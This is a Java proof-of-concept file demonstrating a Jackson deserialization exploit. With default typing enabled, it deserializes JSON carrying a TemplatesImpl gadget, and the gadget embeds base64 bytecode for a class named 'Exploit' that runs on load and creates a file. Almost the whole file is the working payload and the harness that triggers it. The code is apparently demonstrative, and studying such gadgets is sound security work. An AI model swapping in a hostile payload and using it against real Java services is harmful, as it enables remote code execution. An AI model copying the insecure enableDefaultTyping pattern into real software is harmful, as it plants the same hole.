package deserialization;

import java.io.IOException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Deserialization {

	static class Bean1599 {
		public int id;
		public Object obj;
	}

	public static void main(String[] args) throws Exception {

		String json =
		  "{\"id\": 124,\n" 
		+ " \"obj\":[ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n"
		+ "  {\n" 
		+ "    \"transletBytecodes\" : [ \"yv66vgAAADMAOQoADwAgCQAhACIIACMKACQAJQcAJggAJwoABQAoCgAFACkIACoIACsIACwIAC0JAA4ALgcALQcALwEABGluZm8BABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAMAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAMRXhwbG9pdC5qYXZhDAASABMHADEMADIAMwEAE0V4cGxvaXQgQ29uc3RydWN0b3IHADQMADUANgEADGphdmEvaW8vRmlsZQEACn4vRXZpbEZpbGUMABIANgwANwA4AQASRXhwbG9pdCB0cmFuc2Zvcm0xAQASRXhwbG9pdCB0cmFuc2Zvcm0yAQAYSSBhbSB0aGUgaW5qZWN0ZWQgY2xhc3MhAQAHRXhwbG9pdAwAEAARAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1jcmVhdGVOZXdGaWxlAQADKClaACEADgAPAAAAAQAJABAAEQAAAAUAAQASABMAAgAUAAAAPgADAAEAAAAaKrcAAbIAAhIDtgAEuwAFWRIGtwAHtgAIV7EAAAABABUAAAASAAQAAAAHAAQACAAMAAkAGQAKABYAAAAEAAEAFwABABgAGQABABQAAAAlAAIABAAAAAmyAAISCbYABLEAAAABABUAAAAKAAIAAAAQAAgAEQABABgAGgABABQAAAAlAAIAAwAAAAmyAAISCrYABLEAAAABABUAAAAKAAIAAAAWAAgAFwABABsAHAABABQAAAAbAAEAAQAAAAMSC7AAAAABABUAAAAGAAEAAAAbAAgAHQATAAEAFAAAAB4AAQAAAAAABhIMswANsQAAAAEAFQAAAAYAAQAAAAUAAQAeAAAAAgAf\" ],\n" 
		+ "    \"transletName\" : \"a.b\",\n"
		+ "    \"outputProperties\" : { }\n" 
		+ "  }\n" 
		+ " ]\n" 
		+ "}";

		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();

		try {
			Bean1599 object = mapper.readValue(json, Bean1599.class);
			System.out.println("Allocated Object: " + object);
			System.out.println("ID: " + object.id);
			System.out.println("Payload: " + object.obj);

			System.out.println((object.obj).toString());

		} catch (IOException e) {
			System.out.println("Exploit failed");
			e.printStackTrace();
		}
	}
}
